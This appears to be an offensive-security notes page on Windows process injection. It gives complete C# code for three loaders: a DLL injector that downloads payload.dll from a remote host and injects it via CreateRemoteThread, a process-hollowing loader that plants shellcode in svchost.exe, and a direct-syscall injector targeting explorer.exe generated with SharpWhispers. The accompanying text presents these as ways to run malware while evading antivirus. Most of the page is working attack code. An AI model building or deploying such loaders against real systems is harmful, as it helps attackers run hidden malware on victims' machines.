---
title: Process injection and migration
tags:
  - breach
  - operations
  - process
  - injection
  - migration
  - csharp
  - win32api
  - api
  - hollow
  - antivirus
  - evasion
---

## Baby's first DLL injection

A common tactic to execute malware without it touching disk is to inject it into
a target process. This also helps us hide our malware from antiviruses or manual
user inspection. This technique is super common, however, so if security
software like Windows Defender is enabled, this will likely be detected.
Regardless, the C# .NET code provided below uses various Win32 API methods to
inject a malicious DLL into a target process:

```csharp
﻿using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId
    );

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport(
        "kernel32",
        CharSet = CharSet.Ansi,
        ExactSpelling = true,
        SetLastError = true
    )]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(
        "kernel32.dll",
        CharSet = CharSet.Auto,
        ExactSpelling = true,
        SetLastError = true
    )]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    private static readonly uint PROCESS_ALL_ACCESS = 0x001F0FFF;

    static async Task DownloadFileAsync(string url, string destinationPath)
    {
        using HttpClient httpClient = new HttpClient();

        using HttpResponseMessage response = await httpClient.GetAsync(
            url,
            HttpCompletionOption.ResponseHeadersRead
        );

        response.EnsureSuccessStatusCode();

        using FileStream fileStream = new FileStream(
            destinationPath,
            FileMode.Create,
            FileAccess.Write,
            FileShare.None
        );

        await response.Content.CopyToAsync(fileStream);
    }

    static async Task Main(string[] args)
    {
        string dllName = Path.GetTempPath() + "\\payload.dll";
        string lHost = args[0];
        string payloadUri = "http://" + lHost + "/payload.dll";

        await DownloadFileAsync(payloadUri, dllName);

        string targetProcessName = args[1];
        int targetProcessId =
            Process.GetProcessesByName(targetProcessName).First().Id;
        IntPtr hProcess =
            OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);

        IntPtr addr =
            VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

        IntPtr outSize;
        WriteProcessMemory(
            hProcess,
            addr,
            Encoding.Default.GetBytes(dllName),
            dllName.Length,
            out outSize
        );

        IntPtr loadLib =
            GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

        CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            0,
            loadLib,
            addr,
            0,
            IntPtr.Zero
        );
    }
}
```

## Baby's first process hollow

Process hollowing is another evasion mechanism for executing our malware. This
technique involves invoking a process using a legit portable executable (PE)
from a directory like `C:\Windows\System32` like `svchost.exe`. When we invoke
the process, however, we start it in a suspended state. We hollow out the
contents of the original PE image, replacing it with the contents of our
malware.

After successfully injecting our malware into the hollowed out process, we allow
the process to resume execution, kicking off code execution for our malware.
From the perspective of tools like Task Manager and Process Explorer, we're not
executing malware but a legit PE from the `C:\Windows\System32` directory. Below
is a C# .NET demonstration of this technique:

```csharp
﻿using System.Runtime.InteropServices;
using Structures;
using Payload;

namespace BabyProcessHollow;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(
        string? lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string? lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen,
        ref uint retlen
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
    );

    private static readonly string targetExeName =
        "C:\\Windows\\System32\\svchost.exe";

    private static readonly uint CREATE_SUSPENDED = 0x4;

    public static void Main(string[] args)
    {
        STARTUPINFO startUpInfo = new();

        CreateProcess(
            null,
            targetExeName,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            CREATE_SUSPENDED,
            IntPtr.Zero,
            null,
            ref startUpInfo,
            out PROCESS_INFORMATION processInformation
        );

        uint tmp = new();
        IntPtr hProcess = processInformation.hProcess;
        PROCESS_BASIC_INFORMATION processBasicInformation = new();

        _ = ZwQueryInformationProcess(
            hProcess,
            0,
            ref processBasicInformation,
            (uint)Marshal.SizeOf<PROCESS_BASIC_INFORMATION>(),
            ref tmp
        );

        IntPtr pImageBase =
            (IntPtr)((Int64)processBasicInformation.PebAddress + 0x10);

        byte[] ptrBuf = new byte[IntPtr.Size];

        ReadProcessMemory(
            hProcess,
            pImageBase,
            ptrBuf,
            ptrBuf.Length,
            out nint nRead
        );

        byte[] PEHeader = new byte[0x200];
        IntPtr pPEBase = (IntPtr)BitConverter.ToInt64(ptrBuf, 0);

        ReadProcessMemory(
            hProcess,
            pPEBase,
            PEHeader,
            PEHeader.Length,
            out nRead
        );

        uint entryPointOffset = BitConverter.ToUInt32(PEHeader, 0x3c) + 0x28;
        uint entryPointRVA =
            BitConverter.ToUInt32(PEHeader, (int)entryPointOffset);
        IntPtr pEntryPoint = (IntPtr)(entryPointRVA + (UInt64)pPEBase);

        WriteProcessMemory(
            hProcess,
            pEntryPoint,
            Shellcode.buf,
            Shellcode.buf.Length,
            out nint nWrite
        );

        _ = ResumeThread(processInformation.hThread);
    }
}
```

## Direct system calls

Invoking methods directly from libraries like `kernel32.dll`, etc. are monitored
by security software like Windows Defender. Making direct system calls, however,
is another technique we can use to try and avoid detection. Using a library like
[SharpWhispers](https://github.com/SECFORCE/SharpWhispers) provides us with
methods to auto-generate the necessary library code to make direct system calls
to the Windows kernel to avoid detection. We also use lesser known, undocumented
`Nt*` methods to bypass detection.

The following **Python** command uses SharpWhispers to generate the header files
for our payload:

```bash
python3 SharpWhispers.py -f \
    NtOpenProcess,\
    NtCreateSection,\
    NtMapViewOfSection,\
    NtWriteVirtualMemory,\
    NtProtectVirtualMemory,\
    NtCreateThreadEx\
    -o SharpWhispers
```

The following C# .NET code uses the library code provided by SharpWhispers to
generate a payload that uses sneaky techniques to execute our process injection
procedure:

```csharp
﻿using System;
using System.Diagnostics;
using System.Linq;
using Data = SharpWhispers.Data;
using Syscall = Syscalls.Syscalls;

namespace Inject
{

unsafe public class Program
{
    private static uint SEC_COMMIT = 0x8000000;

    public static void Main(string[] args)
    {
        ulong pageSize = 0x1000;
        IntPtr sectionHandle = IntPtr.Zero;
        uint sectionMask =
            (uint)(Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_READ |
                   Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_WRITE |
                   Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_EXECUTE);

        Syscall.NtCreateSection(
            ref sectionHandle,
            sectionMask,
            IntPtr.Zero,
            ref pageSize,
            Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            IntPtr.Zero
        );

        IntPtr localSectionAddress = IntPtr.Zero;
        IntPtr tmp = IntPtr.Zero;
        IntPtr hThis = Process.GetCurrentProcess().Handle;

        Syscall.NtMapViewOfSection(
            sectionHandle,
            hThis,
            ref localSectionAddress,
            IntPtr.Zero,
            IntPtr.Zero,
            tmp,
            ref pageSize,
            2,
            0,
            Data.Win32.WinNT.PAGE_READWRITE
        );

        uint explorerId =
            (uint)Process.GetProcessesByName("explorer").First().Id;
        IntPtr hProcess = Syscall.NtOpenProcess(
            explorerId,
            Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS
        );
        IntPtr remoteSectionAddress = IntPtr.Zero;

        Syscall.NtMapViewOfSection(
            sectionHandle,
            hProcess,
            ref remoteSectionAddress,
            IntPtr.Zero,
            IntPtr.Zero,
            tmp,
            ref pageSize,
            2,
            0,
            Data.Win32.WinNT.PAGE_EXECUTE_READWRITE
        );

        byte[] buf = new byte[907] { INSERT_SHELLCODE_HERE };

        IntPtr bufSize = (IntPtr)buf.Length;
        IntPtr bufPtr = IntPtr.Zero;

        unsafe
        {
            fixed(byte *p = buf)
            {
                bufPtr = (IntPtr)p;
            }
        }

        Syscall.NtWriteVirtualMemory(
            hThis,
            localSectionAddress,
            bufPtr,
            (uint)bufSize
        );

        IntPtr hThread = IntPtr.Zero;

        Syscall.NtCreateThreadEx(
            ref hThread,
            Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL,
            IntPtr.Zero,
            hProcess,
            remoteSectionAddress,
            IntPtr.Zero,
            false,
            0,
            0,
            0,
            IntPtr.Zero
        );
    }
}
}
```

## Related pages

- [[antivirus-evasion|Antivirus evasion]]
